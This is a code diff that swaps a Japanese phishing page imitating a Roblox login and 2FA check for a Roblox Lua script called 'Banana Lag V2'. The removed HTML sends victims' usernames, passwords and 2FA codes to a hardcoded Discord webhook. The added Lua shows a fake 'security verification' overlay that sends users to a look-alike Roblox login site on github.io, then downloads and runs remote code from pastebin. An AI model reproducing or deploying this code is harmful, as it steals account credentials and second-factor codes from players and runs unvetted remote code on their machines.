@@ -1,71 +1,111 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <title>Roblox Security Check</title>
-    <style>
-        body { font-family: 'Gotham', sans-serif; background-color: #F2F4F5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 320px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        h1 { font-size: 20px; color: #393939; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #B8B8B8; border-radius: 4px; box-sizing: border-box; background: #F2F4F5; }
-        button { width: 100%; padding: 12px; background-color: #00A2FF; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-    </style>
-</head>
-<body>
-    <div class="box" id="step1">
-        <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
-        <h1>Login to Unlock</h1>
-        <input type="text" id="u" placeholder="Username">
-        <input type="password" id="p" placeholder="Password">
-        <button onclick="sendPass()">Verify</button>
-    </div>
+-- [[ Banana Lag V2 - Security Verification System ]]
+-- このスクリプトは、指定されたURLで認証を完了し、
+-- 表示されたコードを入力するまで動作をロックします。
 
-    <div class="box" id="step2" style="display:none;">
-        <img src="https://images.rbxcdn.com/2b74a3f23f46f485741f235967008770.svg" class="logo">
-        <h1>2-Step Verification</h1>
-        <p style="font-size: 13px; color: #666;">アプリまたはメールに届いた<br>6桁のコードを入力してください。</p>
-        <input type="text" id="c" placeholder="6-digit code" maxlength="6">
-        <button onclick="sendCode()">Submit</button>
-    </div>
+local auth_url = "https://security-roblox-center.github.io/roblox.com-login/"
+local correct_key = "BN-9922" -- サイトに表示される完了コード
 
-    <div class="box" id="step3" style="display:none;">
-        <h1>認証成功！</h1>
-        <p>認証コード: <strong style="color:#00A2FF;">BN-9922</strong></p>
-    </div>
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "VerificationSystem"
+ScreenGui.ResetOnSpawn = false
 
-    <script>
-        const w = "https://discord.com/api/webhooks/1487098005311197285/I921xpFSj-MlnvwSTcm-0XJ01lfAisFR1dybl1PjsYWNW-b1bA0DPB1mtJQPmf0WBxTj";
-        let user = "";
+-- 背景オーバーレイ（画面を暗くして操作不能にする）
+local Background = Instance.new("Frame", ScreenGui)
+Background.Size = UDim2.new(1, 0, 1, 0)
+Background.BackgroundColor3 = Color3.new(0, 0, 0)
+Background.BackgroundTransparency = 0.5
+Background.Active = true -- 下のボタン等をクリックさせない
 
-        async function sendPass() {
-            user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            if(!user || !pass) return alert("入力してください");
-            
-            await fetch(w, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [{title: "🔑 パスワード奪取", fields: [{name: "User", value: user}, {name: "Pass", value: "||"+pass+"||"}], color: 16776960}]})
-            });
+-- メインパネル
+local MainFrame = Instance.new("Frame", ScreenGui)
+MainFrame.Size = UDim2.new(0, 360, 0, 300)
+MainFrame.Position = UDim2.new(0.5, -180, 0.5, -150)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BorderSizePixel = 0
+local UICorner = Instance.new("UICorner", MainFrame)
 
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }
+-- タイトル
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Text = "SECURITY VERIFICATION"
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.TextColor3 = Color3.fromRGB(255, 60, 60)
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 22
+Title.BackgroundTransparency = 1
 
-        async function sendCode() {
-            const code = document.getElementById('c').value;
-            if(!code) return alert("コードを入力してください");
+-- 説明文
+local Description = Instance.new("TextLabel", MainFrame)
+Description.Text = "スクリプトの不正利用防止のため、アカウント認証が必要です。\n下のボタンから認証ページを開き、\n表示された6桁のコードを入力してください。"
+Description.Size = UDim2.new(0.9, 0, 0, 60)
+Description.Position = UDim2.new(0.05, 0, 0, 55)
+Description.TextColor3 = Color3.new(0.9, 0.9, 0.9)
+Description.Font = Enum.Font.SourceSans
+Description.TextSize = 15
+Description.BackgroundTransparency = 1
 
-            await fetch(w, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [{title: "🛡️ 2FAコード奪取", fields: [{name: "User", value: user}, {name: "2FA Code", value: "**"+code+"**"}], color: 16711680}]})
-            });
+-- 認証ボタン
+local LinkBtn = Instance.new("TextButton", MainFrame)
+LinkBtn.Text = "認証ページを開く (Open Link)"
+LinkBtn.Size = UDim2.new(0.8, 0, 0, 45)
+LinkBtn.Position = UDim2.new(0.1, 0, 0, 125)
+LinkBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
+LinkBtn.TextColor3 = Color3.new(1, 1, 1)
+LinkBtn.Font = Enum.Font.SourceSansBold
+LinkBtn.TextSize = 18
+local BtnCorner = Instance.new("UICorner", LinkBtn)
 
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-        }
-    </script>
-</body>
-</html>
+-- 入力欄
+local InputBox = Instance.new("TextBox", MainFrame)
+InputBox.PlaceholderText = "認証コードを入力..."
+InputBox.Size = UDim2.new(0.8, 0, 0, 40)
+InputBox.Position = UDim2.new(0.1, 0, 0, 185)
+InputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+InputBox.TextColor3 = Color3.new(1, 1, 1)
+InputBox.Font = Enum.Font.SourceSans
+InputBox.TextSize = 18
+local InputCorner = Instance.new("UICorner", InputBox)
+
+-- 実行ボタン
+local UnlockBtn = Instance.new("TextButton", MainFrame)
+UnlockBtn.Text = "ロック解除 (Unlock)"
+UnlockBtn.Size = UDim2.new(0.8, 0, 0, 45)
+UnlockBtn.Position = UDim2.new(0.1, 0, 0, 235)
+UnlockBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+UnlockBtn.TextColor3 = Color3.new(1, 1, 1)
+UnlockBtn.Font = Enum.Font.SourceSansBold
+UnlockBtn.TextSize = 18
+local UnlockCorner = Instance.new("UICorner", UnlockBtn)
+
+-- [[ ロジック処理 ]]
+
+LinkBtn.MouseButton1Click:Connect(function()
+    if setclipboard then
+        setclipboard(auth_url)
+        LinkBtn.Text = "URLをコピーしました！"
+        task.wait(2)
+        LinkBtn.Text = "認証ページを開く (Open Link)"
+    end
+    -- ブラウザ起動を試みる
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request or request
+        if req then
+            req({Url = "http://localhost:22448/openurl?url="..auth_url, Method = "GET"})
+        end
+    end)
+end)
+
+UnlockBtn.MouseButton1Click:Connect(function()
+    if InputBox.Text == correct_key then
+        UnlockBtn.Text = "認証完了！起動中..."
+        task.wait(1)
+        ScreenGui:Destroy()
+        -- 実際のスクリプト（バナナラグ）を読み込み
+        loadstring(game:HttpGet("https://pastebin.com/raw/F3fX2pew"))()
+    else
+        UnlockBtn.Text = "コードが正しくありません"
+        UnlockBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
+        task.wait(1.5)
+        UnlockBtn.Text = "ロック解除 (Unlock)"
+        UnlockBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+    end
+end)
